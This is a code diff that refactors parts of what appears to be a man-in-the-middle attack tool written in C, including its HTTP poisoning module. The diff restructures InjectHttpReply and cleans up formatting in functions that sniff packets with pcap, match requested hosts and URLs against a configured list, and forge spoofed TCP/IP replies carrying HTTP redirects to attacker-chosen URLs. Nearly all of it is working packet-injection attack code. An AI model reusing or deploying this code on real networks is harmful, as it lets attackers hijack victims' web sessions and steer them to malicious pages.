@@ -10,6 +10,7 @@
 #include "APE.h"
 #include "HttpPoisoning.h"
 #include "LinkedListHttpInjections.h"
+#include "Logging.h"
 
 
 extern PHTTPINJECTIONNODE gHttpInjectionList;
@@ -35,55 +36,65 @@ int InjectHttpReply(pcap_t * ifcHandleParam, unsigned char *dataParam, int dataL
   HTTPREQ httpRequest;
   PHTTPINJECTIONNODE node = NULL;
 
-
-  if (dataParam != NULL && htons(ethrHdr->ether_type) == ETHERTYPE_IP)
+  if (dataParam == NULL || htons(ethrHdr->ether_type) != ETHERTYPE_IP)
   {
-    ipHdr = (PIPHDR)(dataParam + sizeof(ETHDR));
-    ipHdrLen = (ipHdr->ver_ihl & 0xf) * 4;
+    retVal = NOK;
+    goto END;
+  }
 
-    if (ipHdr != NULL && ipHdr->proto == IP_PROTO_TCP)
+  ipHdr = (PIPHDR)(dataParam + sizeof(ETHDR));
+  ipHdrLen = (ipHdr->ver_ihl & 0xf) * 4;
+
+  if (ipHdr == NULL || ipHdr->proto != IP_PROTO_TCP)
+  {
+    retVal = NOK;
+    goto END;
+  }
+
+  tcpHdr = (PTCPHDR)((unsigned char*)ipHdr + ipHdrLen);
+  tcpHdrLen = (tcpHdr->doff * 4);
+  totalLength = ntohs(ipHdr->tlen);
+  dataLength = totalLength - ipHdrLen - tcpHdrLen;
+
+  if (dataLength <= 10 || tcpHdr->psh != 1)
+  {
+    retVal = NOK;
+    goto END;
+  }
+
+  ZeroMemory(request, sizeof(request));
+  dPtr = (char *)tcpHdr + tcpHdrLen;
+
+  for (i = 0; i < dataLength && i < MAX_BUF_SIZE && dPtr != NULL; i++, dPtr++)
+  {
+    if (dPtr[0] > 31 && dPtr[0] < 127)
+      request[i] = dPtr[0];
+    else if (dPtr[0] == '\n')
+      request[i] = '\n';
+    else if (dPtr[0] == '\r')
+      request[i] = '\r';
+    else
+      request[i] = ' ';
+  }
+
+
+  ZeroMemory(&httpRequest, sizeof(httpRequest));
+  if (ParseRequest(request, &httpRequest) == OK)
+  {
+    if ((node = GetNodeByRequestedUrl(gHttpInjectionList, (unsigned char *)httpRequest.Host, (unsigned char *)httpRequest.URL)) != NULL)
     {
-      tcpHdr = (PTCPHDR)((unsigned char*)ipHdr + ipHdrLen);
-
-      tcpHdrLen = (tcpHdr->doff * 4);
-      totalLength = ntohs(ipHdr->tlen);
-      dataLength = totalLength - ipHdrLen - tcpHdrLen;
-
-
-      if (dataLength > 10 && tcpHdr->psh == 1)
+      if ((retVal = SendRedirect(ethrHdr, ipHdr, tcpHdr, (char *)node->sData.RedirectedURL, ifcHandleParam, dataLengthParam)) == OK)
       {
-        ZeroMemory(request, sizeof(request));
-        dPtr = (char *)tcpHdr + tcpHdrLen;
-
-
-        for (i = 0; i < dataLength && i < MAX_BUF_SIZE && dPtr != NULL; i++, dPtr++)
-        {
-          if (dPtr[0] > 31 && dPtr[0] < 127)
-            request[i] = dPtr[0];
-          else if (dPtr[0] == '\n')
-            request[i] = '\n';
-          else if (dPtr[0] == '\r')
-            request[i] = '\r';
-          else
-            request[i] = ' ';
-        }
-
-
-        ZeroMemory(&httpRequest, sizeof(httpRequest));
-        if (ParseRequest(request, &httpRequest) == OK)
-        {
-          if ((node = GetNodeByRequestedUrl(gHttpInjectionList, (unsigned char *)httpRequest.Host, (unsigned char *)httpRequest.URL)) != NULL)
-          {
-            if ((retVal = SendRedirect(ethrHdr, ipHdr, tcpHdr, (char *)node->sData.RedirectedURL, ifcHandleParam, dataLengthParam)) == OK)
-              LogMsg(DBG_INFO, "HTTP Injection suceeded : %s%s -> %s", node->sData.RequestedHost, node->sData.RequestedURL, node->sData.RedirectedURL);
-            else
-              LogMsg(DBG_INFO, "HTTP Injection failed : %s%s -> %s", node->sData.RequestedHost, node->sData.RequestedURL, node->sData.RedirectedURL);
-
-          }
-        }
+        LogMsg(DBG_INFO, "HTTP Injection suceeded : %s%s -> %s", node->sData.RequestedHost, node->sData.RequestedURL, node->sData.RedirectedURL);
+      }
+      else
+      {
+        LogMsg(DBG_INFO, "HTTP Injection failed : %s%s -> %s", node->sData.RequestedHost, node->sData.RequestedURL, node->sData.RedirectedURL);
       }
     }
   }
+
+END:
 
   return retVal;
 }
@@ -101,7 +112,7 @@ int ParseRequest(char *request, PHTTPREQ httpRequest)
   int len = 0;
   char *tmpDataPtr = request;
   char *endPtr = NULL;
-  char *newLines   = "\r\n";
+  char *newLines = "\r\n";
   char *tmpPtr = NULL;
 
   if (request != NULL && httpRequest != NULL)
@@ -146,11 +157,11 @@ int ParseRequest(char *request, PHTTPREQ httpRequest)
           strncpy(httpRequest->Host, tmpDataPtr, endPtr - tmpDataPtr);
           if (strpbrk(httpRequest->Host, "\n\r") != NULL)
           {
-            tmpPtr = strpbrk(httpRequest->Host, "\n\r"); 
+            tmpPtr = strpbrk(httpRequest->Host, "\n\r");
             tmpPtr = NULL;
           }
 
-          httpRequest->Host[strnlen(httpRequest->Host, sizeof(httpRequest->Host)-1)-1] = 0;
+          httpRequest->Host[strnlen(httpRequest->Host, sizeof(httpRequest->Host) - 1) - 1] = 0;
         }
       }
     }
@@ -185,8 +196,8 @@ void ParseHtmlInjectionConfigFile(char *configFile)
 
     while (fgets(tmpLine, sizeof(tmpLine), fileHandle) != NULL)
     {
-      while (tmpLine[strlen(tmpLine)-1] == '\r' || tmpLine[strlen(tmpLine)-1] == '\n')
-        tmpLine[strlen(tmpLine)-1] = '\0';
+      while (tmpLine[strlen(tmpLine) - 1] == '\r' || tmpLine[strlen(tmpLine) - 1] == '\n')
+        tmpLine[strlen(tmpLine) - 1] = '\0';
 
       // parse values and add them to the list.
       if (sscanf(tmpLine, "%[^,],%[^,],%s", requestedHost, requestedUrl, redirectedUrl) == 3)
@@ -214,7 +225,7 @@ int SendRedirect(PETHDR ethHdr, PIPHDR ipHdr, PTCPHDR pTCPHdr, char *replacement
   int retVal = NOK;
   unsigned char checker[1024];
   unsigned char packet[1024];
-  PPSEUDOHDR pseudoHdr = (PPSEUDOHDR) checker;
+  PPSEUDOHDR pseudoHdr = (PPSEUDOHDR)checker;
   unsigned char redirBuf[MAX_BUF_SIZE + 1];
   int redirBufLen = 0;
   int ipHdrLen = -1;
@@ -227,12 +238,12 @@ int SendRedirect(PETHDR ethHdr, PIPHDR ipHdr, PTCPHDR pTCPHdr, char *replacement
   {
     // Prepare redirect buffer
     ZeroMemory(redirBuf, sizeof(redirBuf));
-    snprintf((char *) redirBuf, sizeof(redirBuf)-1, FORWARDHEADER, replacementUrl);
-    redirBufLen = strnlen((char *) redirBuf, sizeof(redirBuf)-1);
+    snprintf((char *)redirBuf, sizeof(redirBuf) - 1, FORWARDHEADER, replacementUrl);
+    redirBufLen = strnlen((char *)redirBuf, sizeof(redirBuf) - 1);
 
     // Ether layer
     ZeroMemory(&newEther, sizeof(newEther));
-    CopyMemory(newEther.ether_shost, ethHdr->ether_dhost, BIN_MAC_LEN);   
+    CopyMemory(newEther.ether_shost, ethHdr->ether_dhost, BIN_MAC_LEN);
     CopyMemory(newEther.ether_dhost, ethHdr->ether_shost, BIN_MAC_LEN);
     newEther.ether_type = htons(0x0800);
 
@@ -249,11 +260,11 @@ int SendRedirect(PETHDR ethHdr, PIPHDR ipHdr, PTCPHDR pTCPHdr, char *replacement
     newIpHdr.tos = 0;
     newIpHdr.ttl = 127;
     newIpHdr.ver_ihl = 0x45;  //Version (v4) and  header length(5 nibbles)
-    newIpHdr.crc = ComputeChecksum((unsigned short *) &newIpHdr, sizeof(IPHDR));
+    newIpHdr.crc = ComputeChecksum((unsigned short *)&newIpHdr, sizeof(IPHDR));
 
     // Create TCP Header
-    newTcpHdr.sport = pTCPHdr->dport; 
-    newTcpHdr.dport = pTCPHdr->sport; 
+    newTcpHdr.sport = pTCPHdr->dport;
+    newTcpHdr.dport = pTCPHdr->sport;
     newTcpHdr.ack_seq = htonl(ntohl(pTCPHdr->seq) + dataLen); // pTCPHdr->seq + htonl(sizeof(TCPHDR) + lRedirBufLen);
     newTcpHdr.seq = pTCPHdr->ack_seq;
 
@@ -266,8 +277,8 @@ int SendRedirect(PETHDR ethHdr, PIPHDR ipHdr, PTCPHDR pTCPHdr, char *replacement
 
     newTcpHdr.res1 = pTCPHdr->res1;
     newTcpHdr.doff = 0x5;
-    newTcpHdr.urg_ptr = 0; 
-    newTcpHdr.window = pTCPHdr->window;   
+    newTcpHdr.urg_ptr = 0;
+    newTcpHdr.window = pTCPHdr->window;
     newTcpHdr.check = 0; // For the sake of creating the TCP checksum the checksum field has to be 0. 
 
 
@@ -282,7 +293,7 @@ int SendRedirect(PETHDR ethHdr, PIPHDR ipHdr, PTCPHDR pTCPHdr, char *replacement
     CopyMemory(pseudoHdr->payload, redirBuf, redirBufLen);
 
 
-    newTcpHdr.check = ComputeChecksum((unsigned short *) pseudoHdr, sizeof(PSEUDOHDR) - sizeof((PPSEUDOHDR)NULL)->payload + redirBufLen);
+    newTcpHdr.check = ComputeChecksum((unsigned short *)pseudoHdr, sizeof(PSEUDOHDR) - sizeof((PPSEUDOHDR)NULL)->payload + redirBufLen);
 
 
     ZeroMemory(packet, sizeof(packet));
@@ -307,7 +318,7 @@ int SendRedirect(PETHDR ethHdr, PIPHDR ipHdr, PTCPHDR pTCPHdr, char *replacement
  *
  *
  */
-unsigned short ComputeChecksum (unsigned short *dataPtrParam, int dataLenParam)
+unsigned short ComputeChecksum(unsigned short *dataPtrParam, int dataLenParam)
 {
   unsigned short retVal = 0;
   register unsigned short *lPtr = dataPtrParam;
@@ -324,14 +335,14 @@ unsigned short ComputeChecksum (unsigned short *dataPtrParam, int dataLenParam)
   // mop up an odd byte, if necessary 
   if (dataLeft == 1)
   {
-    *(unsigned char *) (&retVal) = *(unsigned char *) lPtr;
+    *(unsigned char *)(&retVal) = *(unsigned char *)lPtr;
     checkSum += retVal;
   }
 
   // add back carry outs from top 16 bits to low 16 bits
-  checkSum = (checkSum >> 16) + (checkSum &0xffff); 
-  checkSum += (checkSum >> 16); 
-  retVal = ~checkSum; 
+  checkSum = (checkSum >> 16) + (checkSum & 0xffff);
+  checkSum += (checkSum >> 16);
+  retVal = ~checkSum;
 
   return retVal;
 }
@@ -343,5 +354,5 @@ unsigned short ComputeChecksum (unsigned short *dataPtrParam, int dataLenParam)
  */
 unsigned int GetRandomInt(unsigned int min, unsigned int max)
 {
-  return (rand()%(max-min)+min);
+  return (rand() % (max - min) + min);
 }
